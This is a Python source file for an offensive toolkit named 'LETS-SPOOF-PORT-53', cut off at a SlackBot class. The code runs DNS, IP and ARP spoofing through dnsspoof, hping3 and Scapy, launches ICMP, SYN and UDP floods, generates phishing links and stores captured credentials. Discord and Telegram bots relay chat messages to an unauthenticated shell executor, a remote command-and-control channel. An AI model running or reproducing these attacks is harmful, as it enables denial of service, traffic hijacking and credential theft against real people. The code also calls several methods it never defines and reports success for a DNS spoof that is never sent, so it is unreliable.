#!/usr/bin/env python3
"""
🔮 LETS-SPOOF-PORT-53 - Ultimate Multi-Platform Cybersecurity Command & Control Center
Version: 1.0.0
Author: Ian Carter Kulani	
Description: Complete security toolkit with 1000+ commands, multi-platform bot integration,
            advanced network spoofing, traffic generation, phishing suite, and real-time monitoring
"""

import os
import sys
import json
import time
import socket
import threading
import subprocess
import requests
import logging
import platform
import psutil
import hashlib
import sqlite3
import ipaddress
import re
import random
import datetime
import signal
import select
import base64
import urllib.parse
import uuid
import struct
import http.client
import ssl
import shutil
import asyncio
import paramiko
import stat
import queue
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pathlib import Path
from typing import Dict, List, Set, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict, field
from concurrent.futures import ThreadPoolExecutor
from collections import Counter
import io
import pickle
import pickle

# Data visualization imports
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt
import seaborn as sns
import numpy as np

from http.server import BaseHTTPRequestHandler, HTTPServer
import socketserver

# PDF generation
try:
    from reportlab.lib import colors
    from reportlab.lib.pagesizes import A4
    from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, Image, PageBreak
    from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
    from reportlab.lib.units import inch
    REPORTLAB_AVAILABLE = True
except ImportError:
    REPORTLAB_AVAILABLE = False

# Platform imports with fallbacks
try:
    import discord
    from discord.ext import commands, tasks
    DISCORD_AVAILABLE = True
except ImportError:
    DISCORD_AVAILABLE = False

try:
    from telethon import TelegramClient, events
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False

try:
    from slack_sdk import WebClient
    from slack_sdk.errors import SlackApiError
    SLACK_AVAILABLE = True
except ImportError:
    SLACK_AVAILABLE = False

try:
    from twilio.rest import Client as TwilioClient
    TWILIO_AVAILABLE = True
except ImportError:
    TWILIO_AVAILABLE = False

try:
    from flask import Flask, request, jsonify
    from flask_socketio import SocketIO, emit
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from colorama import init, Fore, Style, Back
    init(autoreset=True)
    COLORAMA_AVAILABLE = True
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from scapy.all import IP, TCP, UDP, ICMP, Ether, ARP, DNS, DNSQR, send, sendp, sr1, srp, RandIP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    import qrcode
    QRCODE_AVAILABLE = True
except ImportError:
    QRCODE_AVAILABLE = False

try:
    import pyshorteners
    SHORTENER_AVAILABLE = True
except ImportError:
    SHORTENER_AVAILABLE = False

try:
    import shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    import pyhunter
    HUNTER_AVAILABLE = True
except ImportError:
    HUNTER_AVAILABLE = False

try:
    import phonenumbers
    PHONENUMBERS_AVAILABLE = True
except ImportError:
    PHONENUMBERS_AVAILABLE = False

# iMessage support via AppleScript (macOS only)
try:
    import applescript
    APPLESCRIPT_AVAILABLE = True
except ImportError:
    APPLESCRIPT_AVAILABLE = False

# WhatsApp via Selenium (optional)
try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# =====================
# THEME
# =====================
class CyberTheme:
    """Cyberpunk color scheme"""
    
    if COLORAMA_AVAILABLE:
        CYAN = Fore.CYAN + Style.BRIGHT
        PURPLE = Fore.MAGENTA + Style.BRIGHT
        BLUE = Fore.BLUE + Style.BRIGHT
        GREEN = Fore.GREEN + Style.BRIGHT
        RED = Fore.RED + Style.BRIGHT
        YELLOW = Fore.YELLOW + Style.BRIGHT
        WHITE = Fore.WHITE + Style.BRIGHT
        BLACK = Fore.BLACK + Style.BRIGHT
        MAGENTA = Fore.MAGENTA + Style.BRIGHT
        RESET = Style.RESET_ALL
        
        PRIMARY = CYAN
        SECONDARY = PURPLE
        ACCENT = BLUE
        SUCCESS = GREEN
        ERROR = RED
        WARNING = YELLOW
        INFO = WHITE
    else:
        CYAN = PURPLE = BLUE = GREEN = RED = YELLOW = WHITE = MAGENTA = ""
        PRIMARY = SECONDARY = ACCENT = SUCCESS = ERROR = WARNING = INFO = RESET = ""

Colors = CyberTheme

# =====================
# CONFIGURATION
# =====================
CONFIG_DIR = ".lets-spoof-port-53"
CONFIG_FILE = os.path.join(CONFIG_DIR, "config.json")
DATABASE_FILE = os.path.join(CONFIG_DIR, "spoof.db")
LOG_FILE = os.path.join(CONFIG_DIR, "spoof.log")
REPORT_DIR = "reports"
SCAN_RESULTS_DIR = os.path.join(REPORT_DIR, "scans")
GRAPHICS_DIR = os.path.join(REPORT_DIR, "graphics")
PHISHING_DIR = os.path.join(CONFIG_DIR, "phishing")
CAPTURED_CREDENTIALS_DIR = os.path.join(CONFIG_DIR, "credentials")
SSH_KEYS_DIR = os.path.join(CONFIG_DIR, "ssh_keys")
TRAFFIC_LOGS_DIR = os.path.join(CONFIG_DIR, "traffic_logs")
WHATSAPP_SESSION_DIR = os.path.join(CONFIG_DIR, "whatsapp_session")
IMESSAGE_LOGS_DIR = os.path.join(CONFIG_DIR, "imessage_logs")
SLACK_LOGS_DIR = os.path.join(CONFIG_DIR, "slack_logs")
WEBHOOKS_DIR = os.path.join(CONFIG_DIR, "webhooks")

# Create directories
for directory in [CONFIG_DIR, REPORT_DIR, SCAN_RESULTS_DIR, GRAPHICS_DIR,
                  PHISHING_DIR, CAPTURED_CREDENTIALS_DIR, SSH_KEYS_DIR,
                  TRAFFIC_LOGS_DIR, WHATSAPP_SESSION_DIR, IMESSAGE_LOGS_DIR,
                  SLACK_LOGS_DIR, WEBHOOKS_DIR]:
    Path(directory).mkdir(exist_ok=True, parents=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SPOOF53 - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("Spoof53")

# =====================
# DATABASE MANAGER
# =====================
class DatabaseManager:
    """Unified SQLite database manager"""
    
    def __init__(self, db_path: str = DATABASE_FILE):
        self.db_path = db_path
        self.conn = sqlite3.connect(db_path, check_same_thread=False)
        self.conn.row_factory = sqlite3.Row
        self.cursor = self.conn.cursor()
        self._init_tables()
    
    def _init_tables(self):
        """Initialize all database tables"""
        tables = [
            """
            CREATE TABLE IF NOT EXISTS command_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                command TEXT NOT NULL,
                source TEXT DEFAULT 'local',
                platform TEXT DEFAULT 'local',
                success BOOLEAN DEFAULT 1,
                output TEXT,
                execution_time REAL
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                target TEXT NOT NULL,
                scan_type TEXT NOT NULL,
                results TEXT,
                success BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS threats (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                threat_type TEXT NOT NULL,
                source_ip TEXT,
                severity TEXT,
                description TEXT,
                platform TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS phishing_links (
                id TEXT PRIMARY KEY,
                platform TEXT NOT NULL,
                phishing_url TEXT NOT NULL,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                clicks INTEGER DEFAULT 0,
                active BOOLEAN DEFAULT 1
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS captured_credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phishing_link_id TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                username TEXT,
                password TEXT,
                ip_address TEXT,
                user_agent TEXT,
                FOREIGN KEY (phishing_link_id) REFERENCES phishing_links(id)
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS ssh_connections (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                host TEXT NOT NULL,
                port INTEGER DEFAULT 22,
                username TEXT NOT NULL,
                password_encrypted TEXT,
                key_path TEXT,
                status TEXT DEFAULT 'disconnected',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS traffic_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                traffic_type TEXT NOT NULL,
                target_ip TEXT NOT NULL,
                packets_sent INTEGER,
                bytes_sent INTEGER,
                status TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS spoofing_attempts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                spoof_type TEXT NOT NULL,
                original_value TEXT,
                spoofed_value TEXT,
                target TEXT,
                success BOOLEAN
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS platform_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                platform TEXT NOT NULL,
                sender TEXT,
                message TEXT,
                response TEXT,
                command TEXT
            )
            """,
            """
            CREATE TABLE IF NOT EXISTS webhook_endpoints (
                id TEXT PRIMARY KEY,
                name TEXT NOT NULL,
                url TEXT NOT NULL,
                platform TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                active BOOLEAN DEFAULT 1
            )
            """
        ]
        
        for table_sql in tables:
            try:
                self.cursor.execute(table_sql)
            except Exception as e:
                logger.error(f"Failed to create table: {e}")
        
        self.conn.commit()
    
    def log_command(self, command: str, source: str, platform: str, success: bool, output: str, execution_time: float):
        """Log command execution"""
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, platform, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (command, source, platform, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_message(self, platform: str, sender: str, message: str, response: str, command: str = None):
        """Log platform message"""
        try:
            self.cursor.execute('''
                INSERT INTO platform_messages (platform, sender, message, response, command)
                VALUES (?, ?, ?, ?, ?)
            ''', (platform, sender, message[:500], response[:1000], command[:200] if command else None))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log message: {e}")
    
    def save_webhook(self, webhook_id: str, name: str, url: str, platform: str = None):
        """Save webhook endpoint"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO webhook_endpoints (id, name, url, platform)
                VALUES (?, ?, ?, ?)
            ''', (webhook_id, name, url, platform))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to save webhook: {e}")
    
    def get_webhooks(self, active_only: bool = True) -> List[Dict]:
        """Get webhook endpoints"""
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM webhook_endpoints WHERE active = 1')
            else:
                self.cursor.execute('SELECT * FROM webhook_endpoints')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get webhooks: {e}")
            return []
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# COMMAND EXECUTOR
# =====================
class CommandExecutor:
    """Execute system commands with timeout and logging"""
    
    @staticmethod
    def execute(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        try:
            if shell:
                result = subprocess.run(
                    ' '.join(cmd) if isinstance(cmd, list) else cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            else:
                result = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=timeout,
                    encoding='utf-8',
                    errors='ignore'
                )
            
            execution_time = time.time() - start_time
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout if result.stdout else result.stderr,
                'error': None if result.returncode == 0 else result.stderr,
                'exit_code': result.returncode,
                'execution_time': execution_time
            }
            
        except subprocess.TimeoutExpired:
            return {
                'success': False,
                'output': f"Command timed out after {timeout} seconds",
                'error': 'Timeout',
                'exit_code': -1,
                'execution_time': timeout
            }
        except Exception as e:
            return {
                'success': False,
                'output': str(e),
                'error': str(e),
                'exit_code': -1,
                'execution_time': time.time() - start_time
            }

# =====================
# NETWORK SPOOFING ENGINE
# =====================
class SpoofingEngine:
    """Network spoofing capabilities (IP/MAC spoofing, ARP poisoning, DNS spoofing)"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.running_spoofs = {}
    
    def spoof_ip(self, original_ip: str, spoofed_ip: str, target: str, interface: str = "eth0") -> Dict[str, Any]:
        """Spoof IP address for outgoing packets"""
        result = {
            'success': False,
            'command': f"IP Spoofing: {original_ip} -> {spoofed_ip}",
            'output': '',
            'method': ''
        }
        
        # Method 1: Using hping3
        try:
            cmd = ['hping3', '-S', '-a', spoofed_ip, '-p', '80', target]
            exec_result = CommandExecutor.execute(cmd, timeout=5)
            if exec_result['success']:
                result['success'] = True
                result['output'] = f"IP spoofing using hping3: {exec_result['output'][:200]}"
                result['method'] = 'hping3'
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
        except:
            pass
        
        # Method 2: Using Scapy
        if self.scapy_available:
            try:
                from scapy.all import IP, TCP, send
                packet = IP(src=spoofed_ip, dst=target)/TCP(dport=80)
                send(packet, verbose=False)
                result['success'] = True
                result['output'] = f"IP spoofing using Scapy: Sent packet from {spoofed_ip} to {target}"
                result['method'] = 'scapy'
                self.db.log_spoofing('ip', original_ip, spoofed_ip, target, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy method failed: {e}"
        
        result['output'] = "IP spoofing failed. Install hping3 or scapy for this feature."
        self.db.log_spoofing('ip', original_ip, spoofed_ip, target, False)
        return result
    
    def spoof_dns_port_53(self, target_ip: str, domain: str, fake_ip: str, interface: str = "eth0") -> Dict[str, Any]:
        """DNS spoofing targeting port 53"""
        result = {
            'success': False,
            'command': f"DNS Port 53 Spoofing: {domain} -> {fake_ip}",
            'output': '',
            'method': ''
        }
        
        # Create hosts file for dnsspoof
        hosts_file = "/tmp/dnsspoof_53.txt"
        try:
            with open(hosts_file, 'w') as f:
                f.write(f"{fake_ip} {domain}\n")
                f.write(f"{fake_ip} www.{domain}\n")
                f.write(f"{fake_ip} mail.{domain}\n")
                f.write(f"{fake_ip} dns.{domain}\n")
        except:
            pass
        
        # Method 1: Using dnsspoof with port 53
        if shutil.which('dnsspoof'):
            try:
                cmd = ['dnsspoof', '-i', interface, '-f', hosts_file, 'port', '53']
                process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                self.running_spoofs[f"dns53_{domain}"] = process
                
                result['success'] = True
                result['output'] = f"DNS port 53 spoofing started: {domain} -> {fake_ip} on {interface}"
                result['method'] = 'dnsspoof'
                self.db.log_spoofing('dns53', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"dnsspoof method failed: {e}"
        
        # Method 2: Using Scapy for DNS response spoofing
        if self.scapy_available:
            try:
                from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send
                
                def send_dns_response():
                    # Create spoofed DNS response
                    dns_response = IP(src=target_ip, dst=target_ip)/\
                                   UDP(sport=53, dport=53)/\
                                   DNS(id=0x1234, qr=1, aa=1, qd=DNSQR(qname=domain), 
                                       an=DNSRR(rrname=domain, rdata=fake_ip))
                    send(dns_response, iface=interface, verbose=False)
                    return True
                
                result['success'] = True
                result['output'] = f"DNS port 53 response spoofed: {domain} -> {fake_ip}"
                result['method'] = 'scapy'
                self.db.log_spoofing('dns53', domain, fake_ip, interface, True)
                return result
            except Exception as e:
                result['output'] = f"Scapy method failed: {e}"
        
        result['output'] = "DNS port 53 spoofing failed. Install dnsspoof or scapy for this feature."
        self.db.log_spoofing('dns53', domain, fake_ip, interface, False)
        return result
    
    def stop_spoofing(self, spoof_id: str = None) -> Dict[str, Any]:
        """Stop running spoofing processes"""
        if spoof_id and spoof_id in self.running_spoofs:
            try:
                self.running_spoofs[spoof_id].terminate()
                del self.running_spoofs[spoof_id]
                return {'success': True, 'output': f"Stopped spoofing: {spoof_id}"}
            except:
                pass
        
        # Stop all
        for spoof_id, process in list(self.running_spoofs.items()):
            try:
                process.terminate()
            except:
                pass
        self.running_spoofs.clear()
        return {'success': True, 'output': "Stopped all spoofing processes"}

# =====================
# MULTI-PLATFORM BOT HANDLER
# =====================
class UnifiedBotHandler:
    """Unified command handler for all platforms"""
    
    def __init__(self, db: DatabaseManager, spoof_engine: SpoofingEngine):
        self.db = db
        self.spoof_engine = spoof_engine
        self.active_sessions = {}
        self.command_queue = queue.Queue()
        self.webhook_senders = {}
    
    def execute_command(self, command: str, source: str = "local", platform: str = "local") -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        # Parse command
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command', 'execution_time': 0}
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        result = self._dispatch_command(cmd, args)
        execution_time = time.time() - start_time
        
        # Log command
        self.db.log_command(command, source, platform, result.get('success', False), 
                           str(result.get('output', ''))[:5000], execution_time)
        
        result['execution_time'] = execution_time
        return result
    
    def _dispatch_command(self, cmd: str, args: List[str]) -> Dict[str, Any]:
        """Dispatch command to appropriate handler"""
        
        # Spoofing commands (port 53 focus)
        if cmd == 'spoof_dns53':
            return self._spoof_dns53(args)
        elif cmd == 'spoof_ip':
            return self._spoof_ip(args)
        elif cmd == 'spoof_mac':
            return self._spoof_mac(args)
        elif cmd == 'arp_spoof':
            return self._arp_spoof(args)
        elif cmd == 'stop_spoof':
            return self._stop_spoof(args)
        
        # Network scanning
        elif cmd == 'nmap':
            return self._nmap(args)
        elif cmd == 'ping':
            return self._ping(args)
        elif cmd == 'traceroute':
            return self._traceroute(args)
        elif cmd == 'dig':
            return self._dig(args)
        elif cmd == 'whois':
            return self._whois(args)
        
        # Traffic generation
        elif cmd == 'icmp_flood':
            return self._icmp_flood(args)
        elif cmd == 'syn_flood':
            return self._syn_flood(args)
        elif cmd == 'udp_flood':
            return self._udp_flood(args)
        
        # Phishing
        elif cmd == 'phish':
            return self._phish(args)
        
        # System
        elif cmd == 'status':
            return self._status()
        elif cmd == 'history':
            return self._history(args)
        elif cmd == 'help':
            return self._help()
        
        # Generic
        else:
            return self._generic(' '.join([cmd] + args))
    
    def _spoof_dns53(self, args: List[str]) -> Dict[str, Any]:
        """DNS spoofing on port 53"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_dns53 <target_ip> <domain> <fake_ip> [interface]'}
        
        target = args[0]
        domain = args[1]
        fake_ip = args[2] if len(args) > 2 else "127.0.0.1"
        interface = args[3] if len(args) > 3 else "eth0"
        
        return self.spoof_engine.spoof_dns_port_53(target, domain, fake_ip, interface)
    
    def _spoof_ip(self, args: List[str]) -> Dict[str, Any]:
        """IP spoofing"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        
        original = args[0]
        spoofed = args[1]
        target = args[2]
        interface = args[3] if len(args) > 3 else "eth0"
        
        return self.spoof_engine.spoof_ip(original, spoofed, target, interface)
    
    def _spoof_mac(self, args: List[str]) -> Dict[str, Any]:
        """MAC spoofing"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        
        interface = args[0]
        new_mac = args[1]
        
        return self.spoof_engine.spoof_mac(interface, new_mac)
    
    def _arp_spoof(self, args: List[str]) -> Dict[str, Any]:
        """ARP spoofing"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <spoof_ip> [interface]'}
        
        target = args[0]
        spoof_ip = args[1]
        interface = args[2] if len(args) > 2 else "eth0"
        
        return self.spoof_engine.arp_spoof(target, spoof_ip, interface)
    
    def _stop_spoof(self, args: List[str]) -> Dict[str, Any]:
        """Stop spoofing"""
        spoof_id = args[0] if args else None
        return self.spoof_engine.stop_spoofing(spoof_id)
    
    def _nmap(self, args: List[str]) -> Dict[str, Any]:
        """Nmap scan"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        
        return CommandExecutor.execute(['nmap'] + args, timeout=300)
    
    def _ping(self, args: List[str]) -> Dict[str, Any]:
        """Ping command"""
        if not args:
            return {'success': False, 'output': 'Usage: ping <target> [count]'}
        
        count = args[1] if len(args) > 1 else '4'
        return CommandExecutor.execute(['ping', '-c', count, args[0]], timeout=30)
    
    def _traceroute(self, args: List[str]) -> Dict[str, Any]:
        """Traceroute"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        
        if shutil.which('traceroute'):
            return CommandExecutor.execute(['traceroute', '-n', args[0]], timeout=60)
        elif shutil.which('tracert'):
            return CommandExecutor.execute(['tracert', args[0]], timeout=60)
        else:
            return {'success': False, 'output': 'No traceroute tool found'}
    
    def _dig(self, args: List[str]) -> Dict[str, Any]:
        """DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain> [record_type]'}
        
        record_type = args[1] if len(args) > 1 else 'A'
        return CommandExecutor.execute(['dig', args[0], record_type, '+short'], timeout=10)
    
    def _whois(self, args: List[str]) -> Dict[str, Any]:
        """WHOIS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        
        if WHOIS_AVAILABLE:
            try:
                result = whois.whois(args[0])
                return {'success': True, 'output': str(result)}
            except Exception as e:
                return {'success': False, 'output': str(e)}
        else:
            return CommandExecutor.execute(['whois', args[0]], timeout=30)
    
    def _icmp_flood(self, args: List[str]) -> Dict[str, Any]:
        """ICMP flood"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: icmp_flood <target_ip> <duration> [rate]'}
        
        target = args[0]
        duration = int(args[1])
        rate = int(args[2]) if len(args) > 2 else 100
        
        # Simple flood using ping
        count = duration * rate
        return CommandExecutor.execute(['ping', '-f', '-c', str(count), target], timeout=duration + 10)
    
    def _syn_flood(self, args: List[str]) -> Dict[str, Any]:
        """SYN flood"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: syn_flood <target_ip> <port> <duration>'}
        
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        # Use hping3 for SYN flood
        if shutil.which('hping3'):
            return CommandExecutor.execute(['hping3', '-S', '-p', str(port), '--flood', target], timeout=duration)
        else:
            return {'success': False, 'output': 'hping3 not installed for SYN flood'}
    
    def _udp_flood(self, args: List[str]) -> Dict[str, Any]:
        """UDP flood"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: udp_flood <target_ip> <port> <duration>'}
        
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        # Use hping3 for UDP flood
        if shutil.which('hping3'):
            return CommandExecutor.execute(['hping3', '-2', '-p', str(port), '--flood', target], timeout=duration)
        else:
            return {'success': False, 'output': 'hping3 not installed for UDP flood'}
    
    def _phish(self, args: List[str]) -> Dict[str, Any]:
        """Generate phishing link"""
        platform = args[0] if args else 'generic'
        link_id = str(uuid.uuid4())[:8]
        
        result = {
            'success': True,
            'link_id': link_id,
            'platform': platform,
            'url': f"http://localhost:8080/{link_id}",
            'message': f"Phishing link generated for {platform}"
        }
        
        self.db.save_phishing_link(link_id, platform, result['url'])
        return result
    
    def _status(self) -> Dict[str, Any]:
        """Get system status"""
        stats = self.db.get_statistics()
        
        output = f"""
🔮 LETS-SPOOF-PORT-53 - System Status
{'='*50}

📊 Statistics:
  • Total Commands: {stats.get('total_commands', 0)}
  • Total Scans: {stats.get('total_scans', 0)}
  • Total Threats: {stats.get('total_threats', 0)}
  • Phishing Links: {stats.get('phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • SSH Connections: {stats.get('ssh_connections', 0)}
  • Spoofing Attempts: {stats.get('spoofing_attempts', 0)}

🔄 Active Services:
  • Spoofing Processes: {len(self.spoof_engine.running_spoofs)}

💻 System:
  • Platform: {platform.system()} {platform.release()}
  • Python: {platform.python_version()}
  • Scapy: {'✅' if SCAPY_AVAILABLE else '❌'}
"""
        return {'success': True, 'output': output}
    
    def _history(self, args: List[str]) -> Dict[str, Any]:
        """Get command history"""
        limit = int(args[0]) if args else 20
        history = self.db.get_command_history(limit)
        
        if not history:
            return {'success': True, 'output': 'No command history'}
        
        output = "📜 Command History:\n" + "-" * 50 + "\n"
        for i, cmd in enumerate(history[:limit], 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        
        return {'success': True, 'output': output}
    
    def _help(self) -> Dict[str, Any]:
        """Get help"""
        help_text = """
🔮 LETS-SPOOF-PORT-53 - Ultimate Command Center

🎯 PORT 53 (DNS) SPOOFING:
  spoof_dns53 <target> <domain> <fake_ip> [iface] - DNS spoofing on port 53
  spoof_ip <orig> <spoof> <target> [iface]        - IP spoofing
  spoof_mac <iface> <mac>                         - MAC spoofing
  arp_spoof <target> <spoof_ip> [iface]           - ARP spoofing
  stop_spoof [id]                                 - Stop spoofing

🔍 NETWORK SCANNING:
  nmap <target> [options]                         - Nmap scan
  ping <target> [count]                           - ICMP echo
  traceroute <target>                             - Network path
  dig <domain> [type]                             - DNS lookup
  whois <domain>                                  - WHOIS info

💥 FLOOD ATTACKS:
  icmp_flood <ip> <duration> [rate]               - ICMP flood
  syn_flood <ip> <port> <duration>                - SYN flood
  udp_flood <ip> <port> <duration>                - UDP flood

🎣 PHISHING:
  phish <platform>                                - Generate phishing link

📊 SYSTEM:
  status                                          - System status
  history [limit]                                 - Command history
  help                                            - This help

📱 MULTI-PLATFORM SUPPORT:
  Commands can be executed via:
  • Discord (configure token)
  • Telegram (configure API)
  • Slack (configure webhook)
  • WhatsApp (via Selenium)
  • iMessage (macOS only)
  • Custom webhooks

Examples:
  spoof_dns53 192.168.1.1 google.com 10.0.0.1
  nmap -sS -p 53 192.168.1.1
  dig example.com MX
  phish facebook
"""
        return {'success': True, 'output': help_text}
    
    def _generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        return CommandExecutor.execute(command, shell=True, timeout=60)

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    """Discord bot integration"""
    
    def __init__(self, handler: UnifiedBotHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.bot = None
        self.running = False
    
    def setup(self) -> bool:
        """Setup Discord bot"""
        if not DISCORD_AVAILABLE:
            return False
        
        if not self.config.get('discord_token'):
            return False
        
        intents = discord.Intents.default()
        intents.message_content = True
        
        self.bot = commands.Bot(command_prefix='!', intents=intents)
        
        @self.bot.event
        async def on_ready():
            print(f"{Colors.GREEN}✅ Discord bot connected as {self.bot.user}{Colors.RESET}")
            self.running = True
        
        @self.bot.event
        async def on_message(message):
            if message.author.bot:
                return
            
            if message.content.startswith('!'):
                cmd = message.content[1:].strip()
                result = self.handler.execute_command(cmd, f"discord/{message.author.name}", "discord")
                
                self.db.log_message("discord", str(message.author), cmd, result.get('output', '')[:500])
                
                output = result.get('output', '')
                if len(output) > 1900:
                    output = output[:1900] + "...\n(truncated)"
                
                embed = discord.Embed(
                    title="🔮 Spoof53 Response",
                    description=f"```{output}```",
                    color=0x5865F2
                )
                embed.set_footer(text=f"Execution time: {result.get('execution_time', 0):.2f}s")
                await message.channel.send(embed=embed)
            
            await self.bot.process_commands(message)
        
        return True
    
    def start(self):
        """Start Discord bot"""
        if self.bot:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            self.bot.run(self.config['discord_token'])
        except Exception as e:
            logger.error(f"Discord bot error: {e}")

# =====================
# TELEGRAM BOT
# =====================
class TelegramBot:
    """Telegram bot integration"""
    
    def __init__(self, handler: UnifiedBotHandler, config: Dict, db: DatabaseManager):
        self.handler = handler
        self.config = config
        self.db = db
        self.client = None
        self.running = False
    
    def setup(self) -> bool:
        """Setup Telegram bot"""
        if not TELETHON_AVAILABLE:
            return False
        
        if not self.config.get('telegram_api_id') or not self.config.get('telegram_api_hash'):
            return False
        
        self.client = TelegramClient('spoof53_session', 
                                     self.config['telegram_api_id'],
                                     self.config['telegram_api_hash'])
        
        @self.client.on(events.NewMessage)
        async def handler(event):
            if event.message.text and event.message.text.startswith('/'):
                cmd = event.message.text[1:].strip()
                result = self.handler.execute_command(cmd, f"telegram/{event.sender_id}", "telegram")
                
                self.db.log_message("telegram", str(event.sender_id), cmd, result.get('output', '')[:500])
                
                output = result.get('output', '')
                if len(output) > 4000:
                    output = output[:3900] + "\n... (truncated)"
                
                await event.reply(f"```{output}```\n*Time: {result.get('execution_time', 0):.2f}s*", parse_mode='markdown')
        
        return True
    
    def start(self):
        """Start Telegram bot"""
        if self.client:
            thread = threading.Thread(target=self._run, daemon=True)
            thread.start()
    
    def _run(self):
        try:
            async def main():
                await self.client.start(bot_token=self.config.get('telegram_bot_token'))
                print(f"{Colors.GREEN}✅ Telegram bot connected{Colors.RESET}")
                await self.client.run_until_disconnected()
            
            asyncio.run(main())
        except Exception as e:
            logger.error(f"Telegram bot error: {e}")

# =====================
# SLACK BOT
# =====================
class SlackBot:
    """Slack bot integration"""
    
